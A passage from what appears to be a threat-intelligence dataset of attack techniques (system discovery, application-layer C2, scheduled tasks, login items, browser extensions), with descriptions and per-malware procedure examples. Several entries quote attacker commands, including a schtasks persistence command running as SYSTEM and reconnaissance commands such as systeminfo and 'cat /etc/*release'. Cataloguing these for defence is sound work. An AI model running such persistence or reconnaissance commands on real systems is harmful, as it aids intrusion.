system volume information of a compromised host.', '[MacMa] can collect information about a compromised computer, including: Hardware UUID, Mac serial number, macOS version, and disk sizes.', 'A system info module in [CozyCar] gathers information on the victim host’s configuration.', 'During its initial execution, [BACKSPACE] extracts operating system information from the infected host.', '[ZxxZ] has collected the host name and operating system product name from a compromised machine. ', '[KONNI] can gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim’s machine and has used <code>cmd /c systeminfo</code> command to get a snapshot of the current system state of the target machine.', '[PowerShower] has collected system information on the infected host.', '[TajMahal] has the ability to identify hardware information, the computer name, and OS information on an infected host.', ""During [Frankenstein] the threat actors used [Empire] to obtain the compromised machine's name."", '[SocGholish] has the ability to enumerate system information including the victim computer name.', ""[Dtrack] can collect the victim's computer name, hostname and adapter information to create a unique identifier."", ""[Blue Mockingbird] has collected hardware details for the victim's system, including CPU and memory information."", '[Netwalker] can determine the system architecture it is running on to choose which version of the DLL to use.', '[BLUELIGHT] has collected the computer name and OS version from victim machines.', ""[Milan] can enumerate the targeted machine's name and GUID."", '[HEXANE] has collected the hostname of a compromised machine.', ""[PowerDuke] has commands to get information about the victim's name, build, version, serial number, and memory usage."", 'During [Operation CuckooBees] the threat actors used the `systeminfo` command to gather details about a compromised system.', '[ZxShell] can collect the local hostname, operating system details, CPU speed, and total physical memory. ', ' [Royal] can use `GetNativeSystemInfo` and `GetLogicalDrives` to enumerate system processors and logical drives.', '[Shark] can collect the GUID of a targeted machine.', '[Nebulae] can discover logical drive information including the drive type, free space, and volume information.', '[KillDisk] retrieves the hard disk name by calling the <code>CreateFileA to \\\\.\\PHYSICALDRIVE0</code> API.', '[MURKYTOP] has the capability to retrieve information about the OS.', '[Anchor] can determine the hostname and linux version on a compromised host.', '[Orz] can gather the victim OS version and whether it is 64 or 32 bit.', '[PipeMon] can collect and send OS version and computer name as a part of its C2 beacon.', ""[Shamoon] obtains the victim's operating system version and keyboard layout and sends the information to the C2 server."", '[4H RAT] sends an OS version identifier in its beacons.', '[Denis] collects OS information and the computer name from the victim’s machine.', '[Astaroth] collects the machine name and keyboard language from the system. ', '[Kevin] can enumerate the OS version and hostname of a targeted machine.', '[Darkhotel] has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.', '[BADHATCH] can obtain current system information from a compromised machine such as the `SHELL PID`, `PSVERSION`, `HOSTNAME`, `LOGONSERVER`, `LASTBOOTUP`, drive information, OS type/version, bitness, and hostname. ', '[WinMM] collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.', ""[DEADEYE] can enumerate a victim computer's volume serial number and host name."", '[TA2541] has collected system information prior to downloading malware on the targeted host.', '[Woody RAT] can retrieve the following information from an infected machine: OS, architecture, computer name, OS build version, environment variables, and storage drives.', '[MiniDuke] can gather the hostname on a compromised machine.', '[FIN13] has collected local host information by utilizing Windows commands `systeminfo`, `fsutil`, and `fsinfo`. [FIN13] has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.', '[ZLib] has the ability to enumerate system information.', ""[Rocke] has used uname -m to collect the name and information about the infected system's kernel."", '[InnaputRAT] gathers volume drive information and system information.', '[Bonadan] has discovered the OS version, CPU model, and RAM size of the system it has been installed on.', '[Cyclops Blink] has the ability to query device information.', ""[Volgmer] can gather system information, the computer name, OS version, drive and serial information from the victim's machine."", ""A [Gamaredon Group] file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server."", '[WarzoneRAT] can collect compromised host information, including OS version, PC name, RAM size, and CPU details.', '[DownPaper] collects the victim host name and serial number, and then sends the information to the C2 server.', '[Empire] can enumerate host system information like OS, architecture, domain name, applied patches, and more.', '[BlackCat] can obtain the computer name and UUID, and enumerate local drives.', '[HAWKBALL] can collect the OS version, architecture information, and computer name.', '[SynAck] gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.', '[APT37] collects the computer name, the BIOS model, and execution path.', ""[EVILNUM] can obtain the computer name from the victim's system."", '[SHUTTERSPEED] can collect system information.', '[KOMPROGO] is capable of retrieving information about the infected system.', ""[APT32] has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. [APT32] executed shellcode to identify the name of the infected host."", '[AsyncRAT] can check the disk size through the values obtained with `DeviceInfo.`', '[SpicyOmelette] can identify the system name of a compromised host.', '[MirageFox] can collect CPU and architecture information from the victim’s machine.', '[QuasarRAT] can gather system information from the victim’s machine including the OS type.', '[T9000] gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.', '[DarkTortilla] can obtain system information by querying the `Win32_ComputerSystem`, `Win32_BIOS`, `Win32_MotherboardDevice`, `Win32_PnPEntity`, and `Win32_DiskDrive` WMI objects.', '[Green Lambert] can use `uname` to identify the operating system name, version, and processor type.  ', ""[Kasidet] has the ability to obtain a victim's system name and operating system version."", '[Emissary] has the capability to execute ver and systeminfo commands.', '[SMOKEDHAM] has used the <code>systeminfo</code> command on a compromised host.', '[Inception] has used a reconnaissance module to gather information about the operating system and hardware on the infected host.', '[FELIXROOT] collects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.', '[Hydraq] creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.', '[Crimson] contains a command to collect the victim PC name, disk drive information, and operating system.', '[Mispadu] collects the OS version, computer name, and language ID.', '[PingPull] can retrieve the hostname of a compromised host.', '[jRAT] collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.', '[POWERSTATS] can retrieve OS name/architecture and computer/domain name information from compromised hosts.', ""[Saint Bot] can identify the OS version, CPU, and other details from a victim's machine."", 'Several [Lazarus Group] malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by [Lazarus Group] also collects disk space information and sends it to its C2 server.', '[FatDuke] can collect the user name, Windows version, computer name, and available space on discs from a compromised host.', '[Volt Typhoon] has discovered file system types, drive names, size, and free space on compromised systems.', '[BadPatch] collects the OS system, OS version, MAC address, and the computer name from the victim’s machine.', '[Chrommme] has the ability to list drives and obtain the computer name of a compromised host.', '[CORESHELL] collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.', '[Moses Staff] collected information about the infected host, including the machine names and OS architecture. ', '[ThreatNeedle] can collect system profile information from a compromised host.', '[Sys10] collects the computer name, OS versioning information, and OS install date and sends the information to the C2.', '[Bankshot] gathers system information, network addresses, disk type, disk free space, and the operation system version.', '[KOCTOPUS] has checked the OS version using `wmic.exe` and the `find` command.', '[KEYMARBLE] has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.', '[OSX_OCEANLOTUS.D] collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. [OSX_OCEANLOTUS.D] has used the <code>ioreg</code> command to gather some of this information.', '[REvil] can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.', '[PoshC2] contains modules, such as <code>Get-ComputerInfo</code>, for enumerating common system information.', ""[Trojan.Karagany] can capture information regarding the victim's OS, security, and hardware configuration."", '[Rising Sun] can detect the computer name, operating system, and drive information, including drive type, total number of bytes on disk, total number of free bytes on disk, and name of a specified volume.\t', '[SOUNDBITE] is capable of gathering system information.', '[Derusbi] gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.', '[FALLCHILL] can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.', '[WellMess] can identify the computer name of a compromised host.', ""[Ixeshe] collects the computer name of the victim's system during the initial infection."", '[zwShell] can obtain the victim PC name and OS version.', '[ServHelper] will attempt to enumerate Windows version and system architecture.', '[Aria-body] has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.', '[Zebrocy] collects the OS version, computer name and serial number for the storage volume C:\\. [Zebrocy] also runs the <code>systeminfo</code> command to gather system information. ', '[DarkComet] can collect the computer name, RAM used, and operating system version from the victim’s machine.', '[BADFLICK] has captured victim computer name, memory space, and CPU details.', '[Higaisa] collected the system volume serial number, GUID, and computer name.', '[Epic] collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.', ""[GRIFFON] has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation ."", '[Revenge RAT] collects the CPU information, OS information, and system language.', 'can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.', '[Grandoreiro] can collect the computer name and OS version from a compromised host.', '[Heyoka Backdoor] can enumerate drives on a compromised host.', '[SodaMaster] can enumerate the host name and OS version on a target system.', '[BISCUIT] has a command to collect the processor type, operation system, computer name, and whether the system is a laptop or PC.', '[OopsIE] checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.', '[CaddyWiper] can use `DsRoleGetPrimaryDomainInformation` to determine the role of the infected machine. [CaddyWiper] can also halt execution if the compromised host is identified as a domain controller.', '[Malteiro] collects the machine information, system architecture, the OS version, computer name, and Windows product name.', '[Snip3] has the ability to query `Win32_ComputerSystem` for system information.  ', '[Kessel] has collected the system architecture, OS version, and MAC address information.', '[NKAbuse] conducts multiple system checks and includes these in subsequent ""heartbeat"" messages to the malware\'s command and control server.', '[Okrum] can collect computer name, locale information, and information about the OS and architecture.', '[Ninja] can obtain the computer name and information on the OS and physical drives from targeted hosts.', '[Skidmap] has the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.', '[AppleJeus] has collected the victim host information after infection.', '[Naid] collects a unique identifier (UID) from a compromised host.', '[LightNeuron] gathers the victim computer name using the Win32 API call <code>GetComputerName</code>.', '[macOS.OSAMiner] can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility `df`.', '[MoonWind] can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.', '[WINDSHIELD] can gather the victim computer name.', '[cmd] can be used to find information about the operating system.', '[OSInfo] discovers information about the infected machine.', '[Octopus] can collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information.', '[SoreFang] can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing [Systeminfo]', '[Kerrdown] has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.', '[BoomBox] can enumerate the hostname, domain, and IP of a compromised host.', '[PoetRAT] has the ability to gather information about the compromised host.', '[StreamEx] has the ability to enumerate system information.', '[AppleSeed] can identify the OS version of a targeted system.', '[ObliqueRAT] has the ability to check for blocklisted computer names on infected endpoints.', '[NDiskMonitor] obtains the victim computer name and encrypts the information to send over its C2 channel.', '[MarkiRAT] can obtain the computer name from a compromised host.', 'A module in [Prikormka] collects information from the victim about Windows OS version, computer name, battery info, and physical memory.', '[HOPLIGHT] has been observed collecting victim machine information like OS version, volume information, and more.', '[PinchDuke] gathers system configuration information.', '[Valak] can determine the Windows version and computer name on a compromised host.', ""[ZeroT] gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server."", '[Pupy] can grab a system’s information including the OS version, architecture, etc.', '[Spark] can collect the hostname, keyboard layout, and language from the system. ', 'The initial beacon packet for [S-Type] contains the operating system version and file system of the victim.', ""[Hildegard] has collected the host's OS, CPU, and memory information."", '[Confucius] has used a file stealer that can examine system drives, including those other than the C drive.', '[Ramsay] can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.\t', '[Fysbis] has used the command <code>ls /etc | egrep -e""fedora\\*|debian\\*|gentoo\\*|mandriva\\*|mandrake\\*|meego\\*|redhat\\*|lsb-\\*|sun-\\*|SUSE\\*|release""</code> to determine which Linux OS version is running.', '[Final1stspy] obtains victim Microsoft Windows version information and CPU architecture.', '[SDBbot] has the ability to identify the OS version, OS bit information and computer name.', '[Pay2Key] has the ability to gather the hostname of the victim machine.', '[Gelsemium] can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.', '[APT38] has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.', '[KARAE] can collect system information.', ""[BackConfig] has the ability to gather the victim's computer name."", '[HermeticWiper] can determine the OS version, bitness, and enumerate physical drives on a targeted host.', 'The initial beacon packet for [Misdat] contains the operating system version of the victim.', '[RotaJakiro] executes a set of commands to collect device information, including `uname`.  Another example is the `cat /etc/*release | uniq` command used to collect the current OS distribution.', '[Mustang Panda] has gathered system information using <code>systeminfo</code>.', '[BADCALL] collects the computer name and host name on the compromised system.', '[OceanSalt] can collect the computer name from the system.', ""[SysUpdate] can collect a system's architecture, operating system version, hostname, and drive information."", '[NavRAT] uses <code>systeminfo</code> on a victim’s machine.', '[Metamorfo] has collected the hostname and operating system version from the compromised host.', '[Clambling] can discover the hostname, computer name, and Windows version of a targeted machine.', 'During [Operation Honeybee] the threat actors collected the computer name, OS, and other system information using `cmd /c systeminfo > %temp%\\ temp.ini`.', '[Kazuar] gathers information on the system and local drives.', '[Pony] has collected the Service Pack, language, and region information to send to the C2.\t', '[UPPERCUT] has the capability to gather the system’s hostname and OS version.', '[Winnti for Windows] can determine if the OS on a compromised host is newer than Windows XP.', '[BabyShark] has executed the <code>ver</code> command.\t', '[InvisiMole] can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.', '[Mafalda] can collect the computer name and enumerate all drives on a compromised host.', '[StoneDrill] has the capability to discover the system OS, Windows version, architecture and environment.\t', '[Proxysvc] collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.', '[Kimsuky] has enumerated drives, OS type, OS version, and other information using a script or the ""systeminfo"" command.', '[AuTo Stealer] has the ability to collect the hostname and OS information from an infected host.', '[HELLOKITTY] can enumerate logical drives on a target system.', '[Remsec] can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.', '[StrifeWater] can collect the OS version, architecture, and machine name to create a unique token for the infected host.', '[Get2] has the ability to identify the computer name and Windows version of an infected host.', '[MuddyWater] has used malware that can collect the victim’s OS version and machine name.', '[Ryuk] has called <code>GetLogicalDrives</code> to emumerate all mounted drives, and <code>GetDriveTypeW</code> to determine the drive type.', '[OSX/Shlayer] has collected the IOPlatformUUID, session UID, and the OS version using the command <code>sw_vers -productVersion</code>.', '[Dridex] has collected the computer name and OS architecture information from the system.', '[LoudMiner] has monitored CPU usage.\t', '[SharpStage] has checked the system settings to see if Arabic is the configured language.', '[TURNEDUP] is capable of gathering system information.', '[Felismus] collects the system information, including hostname and OS version, and sends it to the C2 server.', '[MobileOrder] has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.', '[ChChes] collects the victim hostname, window resolution, and Microsoft Windows version.', '[Uroburos] has the ability to gather basic system information and run the POSIX API `gethostbyname`.', '[TeamTNT] has searched for system version, architecture, disk partition, logical volume, and hostname information.', '[Amadey] has collected the computer name and OS version from a compromised machine.', '[StrongPity] can identify the hard disk volume serial number on a compromised host.', '[build_downer] has the ability to send system volume information to C2.', '[POWRUNER] may collect information about the system by running <code>hostname</code> and <code>systeminfo</code> on a victim.', '[Kwampirs] collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands <code>systeminfo</code>, <code>net config workstation</code>, <code>hostname</code>, <code>ver</code>, <code>set</code>, and <code>date /t</code>.', '[RedLeaves] can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.', '[Lokibot] has the ability to discover the computer name and Windows product name/version.', '[Lizar] can collect the computer name from the machine,. ', '[yty] gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command <code>systeminfo</code>.', '[JPIN] can obtain system information such as OS version and disk space.', '[Lucifer] can collect the computer name, system architecture, default language, and processor frequency of a compromised host.', 'The initial beacon packet for [Mis-Type] contains the operating system version and file system of the victim.', '[gh0st RAT] has gathered system architecture, processor, OS configuration, and installed hardware information.', '[APT3] has a tool that can obtain information about the local system.', 'During the [SolarWinds Compromise] [APT29] used `fsutil` to check available free space before executing actions that might create large files on disk.', '[RunningRAT] gathers the OS version, logical drives information, processor information, and volume information.', '[Comnie] collects the hostname of the victim machine.', '[Sidewinder] has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.', '[KOPILUWAK] can discover logical drive information on compromised hosts.', '[Bandook] can collect information about the drives available on the system. ', ""[Agent Tesla] can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system."", '[WhisperGate] has the ability to enumerate fixed logical drives on a targeted system.', '[Magic Hound] malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.', '[Caterpillar WebShell] has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more. ', '[Ursnif] has used [Systeminfo] to gather system information.', 'During [Operation Wocao] threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.', '[Zox] can enumerate attached drives.', '[SVCReady] has the ability to collect information such as computer name, computer manufacturer, BIOS, operating system, and firmware, including through the use of `systeminfo.exe`.', '[DustySky] extracts basic information about the operating system.', '[Explosive] has collected the computer name from the infected host. ', '[Systeminfo] can be used to gather information about the operating system.', '[Neoichor] can collect the OS version and computer name from a compromised host.', '[SharpDisco] can use a plugin to enumerate system drives.', '[Gold Dragon] collects endpoint information using the <code>systeminfo</code> command.', '[Dyre] has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.', '[SideCopy] has identified the OS version of a compromised host.', 'During [Cutting Edge] threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts.', '[Chimera] has used `fsutil fsinfo drives`, `systeminfo`, and `vssadmin list shadows` for system information including shadow volumes and drive information.', '[Meteor] has the ability to discover the hostname of a compromised host.', '[APT19] collected system architecture information. [APT19] used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.', '[CrackMapExec] can enumerate the system drives and associated system name.', '[APT18] can collect system information from the victim’s machine.', '[Pasam] creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.', '[Cardinal RAT] can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.', '[Ferocious] can use <code>GET.WORKSPACE</code> in Microsoft Excel to determine the OS version of the compromised host.', '[ShimRatReporter] gathered the operating system name and specific Windows version of an infected machine.', '[RTM] can obtain the computer name, OS version, and default language identifier.', '[Action RAT] has the ability to collect the hostname, OS version, and OS architecture of an infected host.', '[FIN8] has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.', 'The [IceApple] Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.', '[XCSSET] identifies the macOS version and uses <code>ioreg</code> to determine serial number.', '[Diavol] can collect the computer name and OS version from the system.', '[Tropic Trooper] has detected a target system’s OS version and system volume information.', '[Bisonal] has used commands and API calls to gather system information.', '[Aquatic Panda] has used native OS commands to understand privilege levels and system details.', '[ROKRAT] can gather the hostname and the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.', '[Industroyer] collects the victim machine’s Windows GUID.', '[TYPEFRAME] can gather the disk volume information.', '[ShadowPad] has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.', '[Mongall] can identify drives on compromised hosts and retrieve the hostname via `gethostbyname`. ', '[QakBot] can collect system information including the OS version and domain on a compromised host.', '[HALFBAKED] can obtain information about the OS, processor, and BIOS.', '[SideTwist] can collect the computer name of a targeted system.', '[RCSession] can gather system information from a compromised host.', '[Cadelspy] has the ability to discover information about the compromised host.', '[Machete] collects the hostname of the target computer. ', '[RogueRobin] gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.', '[Turian] can retrieve system information including OS version, memory usage, local hostname, and system adapter information.', '[Zeus Panda] collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.', '[Carberp] has collected the operating system version from the infected system.', '[FinFisher] checks if the victim OS is 32 or 64-bit.', '[KGH_SPY] can collect drive information from a compromised host.', '[SHARPSTATS] has the ability to identify the IP address, machine name, and OS of the compromised host.', '[Babuk] can enumerate disk volumes, get disk information, and query service status.', '[Mustard Tempest] has used implants to perform system reconnaissance on targeted systems.', ""[DropBook] has checked for the presence of Arabic language in the infected machine's settings. "", '[JHUHUGIT] obtains a build identifier as well as victim hard drive information from Windows registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum</code>. Another [JHUHUGIT] variant gathers the victim storage volume serial number and the storage device name.', '[TAINTEDSCRIBE] can use <code>DriveList</code> to retrieve drive information.', '[Sowbug] obtained OS version and hardware configuration from a victim.', ""[Wizard Spider] has used [Systeminfo] and similar commands to acquire detailed configuration information of a victim's machine. [Wizard Spider] has also utilized the PowerShell cmdlet `Get-ADComputer` to collect DNS hostnames, last logon dates, and operating system information from Active Directory."", '[Turla] surveys a system upon check-in to discover operating system configuration details using the <code>systeminfo</code> and <code>set</code> commands.', '[Penquin] can report the file system type and disk space of a compromised host to C2.', '[NETWIRE] can discover and collect victim system information.', '[HotCroissant] has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.', '[Azorult] can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.', '[DEATHRANSOM] can enumerate logical drives on a target system.', ""[Patchwork] collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. [Patchwork] also enumerated all available drives on the victim's machine."", '[Windshift] has used malware to identify the computer name of a compromised host.', '[BUBBLEWRAP] collects system information, including the operating system version and hostname.', '[VERMIN] collects the OS name, machine name, and architecture information.', '[admin@338] actors used the following commands after exploiting a machine with [LOWBALL] malware to obtain information about the OS: <code>ver >> %temp%\\download</code> <code>systeminfo >> %temp%\\download</code>', '[XAgentOSX] contains the getInstalledAPP function to run <code>ls -la /Applications</code> to gather what applications are installed.', '[NanHaiShu] can gather the victim computer name and serial number.', '[PUNCHBUGGY] can gather system information such as computer names.\t', '[DarkWatchman] can collect the OS version, system architecture, and computer name.', '[WINERACK] can gather information about the host.', '[Pisloader] has a command to collect victim system information, including the system name and OS version.', '[Reaver] collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.', '[Chaes] has collected system information, including the machine name and OS version.', '[GrimAgent] can collect the OS, and build version on a compromised host.', '[NOKKI] can gather information on drives and the operating system on the victim’s machine.', '[BlackEnergy] has used [Systeminfo] to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.', '[ToddyCat] has collected information on bootable drives including model, vendor, and serial numbers.', '[Stealth Falcon] malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.', '[Kobalos] can record the hostname and kernel version of the target machine.', '[Egregor] can perform a language check of the infected system and can query the CPU information (cupid).', '[FunnyDream] can enumerate all logical drives on a targeted machine.', '[POORAIM] can identify system information, including battery status.', '[Backdoor.Oldrea] collects information about the OS and computer name.', '[IcedID] has the ability to identify the computer name and OS version on a compromised host.', '[RATANKBA] gathers information about the OS architecture, OS name, and OS version/Service pack.', '[LITTLELAMB.WOOLTEA] can check the type of Ivanti VPN device it is running on by executing `first_run()` to identify the first four bytes of the motherboard serial number.', '[Bazar] can fingerprint architecture, computer name, and OS version on the compromised host. [Bazar] can also check if the Russian language is installed on the infected machine and terminate if it is found.', ""[Sandworm Team] used a backdoor to enumerate information about the infected system's operating system.\t"", '[Ke3chang] performs operating system information discovery using <code>systeminfo</code> and has used implants to identify the system language and computer name.', '[SLOTHFULMEDIA] has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.', '[LitePower] has the ability to list local drives and enumerate the OS architecture.', '[Cannon] can gather system information from the victim’s machine such as the OS version, machine name, and drive information.', '[dsquery] has the ability to enumerate various information, such as the operating system and host name, for systems within a domain.', '[Attor] monitors the free disk space on the system.', '[SILENTTRINITY] can collect information related to a compromised host, including OS version and a list of drives.', '[SslMM] sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.', '[Avenger] has the ability to identify the host volume ID and the OS architecture on a compromised host.', '[metaMain] can collect the computer name from a compromised host.', 'During [FunnyDream] the threat actors used [Systeminfo] to collect information on targeted hosts.', '[Wingbird] checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.', '[SombRAT] can execute <code>getinfo</code> to enumerate the computer name and OS version of a compromised system.', '[APT29] used <code>fsutil</code> to check available free space before executing actions that might create large files on disk.', '[UNC2452] used <code>fsutil</code> to check available free space before executing actions that might create large files on disk.', '[Honeybee] gathers computer name and information using the <code>systeminfo</code> command.', '[Operation Wocao] has discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.', ""[Frankenstein] has enumerated hosts, looking for the system's machine name."", '[Tropic Trooper] has detected a target system’s OS version.', 'APT28 has enumerated installed applications on macOS devices with built-in utilities such as <code>ls -al /Applications</code>.']",False
T1071,Application Layer Protocol,"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ","['[Hildegard] has used an IRC channel for C2 communications.', '[Magic Hound] malware has used IRC for C2.', 'Adversaries can also use [NETEAGLE] to establish an RDP connection with a controller over TCP/7519.', '[Rocke] issued wget requests from infected systems to the C2.', '[Siloscape] connects to an IRC server for C2.', '[QUIETEXIT] can use an inverse negotiated SSH connection as part of its C2.', '[Duqu] uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.', '[Clambling] has the ability to use Telnet for communication.', '[Lucifer] can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.', '[TeamTNT] has used an IRC bot for C2 communications.', '[Dragonfly 2.0] used SMB for C2.', '[Cobalt Strike] conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.\t', '[Exaramel] uses HTTPS for C2 communications.', 'APT34 malware often uses HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.']",False
T1053,Scheduled Task/Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.  Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution] adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.","['[StrifeWater] has create a scheduled task named `Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB` for persistence.', '[DEADEYE] has used the scheduled tasks `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility`, `\\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`  to establish persistence.', '[Earth Lusca] used the command <code>schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system</code> for persistence.', '[Lokibot] second stage DLL has set a timer using “timeSetEvent” to schedule its next execution.', '[Remsec] schedules the execution one of its modules by creating a new scheduler task.', 'Dragonfly has used a scheduled task to execute a malicious file.']",False
T1162,Login Item,"MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them . Users have direct control over login items installed using a shared file list which are also visible in System Preferences . These login items are stored in the user's <code>~/Library/Preferences/</code> directory in a plist file called <code>com.apple.loginitems.plist</code> . Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to ‘Hide’ the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in  . The API method <code> SMLoginItemSetEnabled </code> can be used to set Login Items, but scripting languages like [AppleScript] can do this as well  .",[],True
T1176,Browser Extensions,"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.  Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.  Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.  Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.  There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control] Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion] ","['[Mispadu] utilizes malicious Google Chrome browser extensions to steal financial data.', '[Kimsuky] has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.', '[OSX/Shlayer] can install malicious Safari browser extensions to serve ads.', '[Grandoreiro] can use malicious browser extensions to steal cookies and other user information.', '[Bundlore] can install malicious browser extensions that are used to hijack user searches.', '[Stolen Pencil] victims are prompted to install malicious Google Chrome extensions which gave the threat actor the ability to read data from any website accessed. ']",False
